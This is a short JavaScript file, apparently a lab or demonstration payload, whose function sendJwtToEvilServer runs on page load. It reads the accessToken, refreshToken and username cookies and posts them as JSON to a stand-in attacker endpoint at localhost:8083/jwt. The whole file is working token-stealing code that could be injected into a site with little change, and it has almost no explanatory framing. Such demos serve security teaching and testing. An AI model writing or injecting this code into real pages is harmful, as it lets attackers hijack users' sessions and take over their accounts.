if (typeof jQuery !== 'undefined') {
    (function($) {
        if (typeof(Storage) !== "undefined") {
            sendJwtToEvilServer();

        } else {
            console.log("LocalStorage not available");
        }
    })(jQuery);
}

function sendJwtToEvilServer() {

    if (cookieExists("accessToken")) {
        var accessToken = getCookie("accessToken");
        var refreshToken = getCookie("refreshToken");
        var username = getCookie("username");
        saveJwt(username, accessToken, refreshToken);
    }
}

function saveJwt(username, accessToken, refreshToken) {
    var jsonData = "{\"username\":\""+username+"\",\"accessToken\":\""+accessToken+"\",\"refreshToken\":\""+refreshToken+"\"}"
    console.log("sendJwtToEvilServer... " + jsonData);

    $.ajax({
        url: 'http://localhost:8083/jwt',
        type: 'post',
        data: jsonData,
        headers: {
            "Accept": 'application/json',
            "Content-Type": 'application/json'
        },
        success: function (data) {
            console.info(data);

        },
        error: function (data){
            console.info(data);
        }
    });
}